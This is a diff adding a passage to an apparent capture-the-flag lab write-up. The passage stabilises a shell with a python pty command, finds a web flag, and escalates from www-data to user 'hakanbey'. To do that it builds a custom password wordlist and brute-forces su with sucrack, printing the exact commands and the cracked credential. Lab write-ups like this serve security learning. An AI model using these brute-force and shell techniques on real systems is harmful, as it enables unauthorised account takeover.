@@ -119,6 +119,57 @@ And we can see on our terminal (where we had set up the netcat listener) we have
 
 ![](/images/gotshell.png)
 
+After getting the shell lets make it a proper stable tty shell.So to do this we need to use the following commands:-
+#### python3 -c 'import pty; pty.spawn("/bin/bash")'
+#### export TERM=xterm 
+![](/images/tty.png)
+Now our job is to find the Web flag.. which was lying in /var/www/html directory with the file name as wwe3bbfl4g.txt 
+We found our first flag!!!
+![](/images/flag1.png)
+
+### www-data -> hakanbey :: Sucrack
+after running linpeas.sh, linenum.sh and even then, not finding any way to escalate from www-data to the local user or root...  *ctf-like* thinking helped!
+
+The room had a tag called sucrack (why something this random) (also never heard of it yet)
+Looking it up,
+
+`sucrack is a multithreaded Linux/UNIX tool for brute-force cracking local user accounts via su. This tool comes in handy as final instance on a system where you have not too many privileges`
+
+So yea... need to use it to crack the user password!!!
+
+But first, a wordlist always helps; rather than *spamming* rockyou lets kill our excitement and see what we have
+
+Two passwords were previously found in this room
+```txt
+123adanaantinwar
+123adanacrack
+```
+
+and any good eye will see that both begins with "123adana"! Hmm,,, lets craft a custom wordlist
+
+So, I wrote a simple bash script,
+```bash
+#!/bin/bash
+start="123adana"
+input="wordlist.txt"
+while IFS= read -r line
+do
+echo $start$line >> superlist.txt
+done < $input
+```
+and uploaded the **superlist.txt** to the server
+
+Compiling sucrack was the issue, many gave the error ```Exec Format Error```. Finally I found `sucrack_1.2.3-5+b1_amd64.deb` this deb file from [source](http://http.kali.org/pool/main/s/sucrack/) which worked.
+
+```bash
+$ cd /tmp
+$ dpkg -x sucrack_1.2.3-5+b1_amd64.deb sucrack
+$ sucrack/usr/bin/sucrack -w 100 -b 500 -u hakanbey superlist.txt   
+```
+`-w` was for threads, without that it takes forever. After 20 seconds or so, I got the password outputted by the program.
+
+hakanbey:123adanasubaru
+
 
 <br>
 
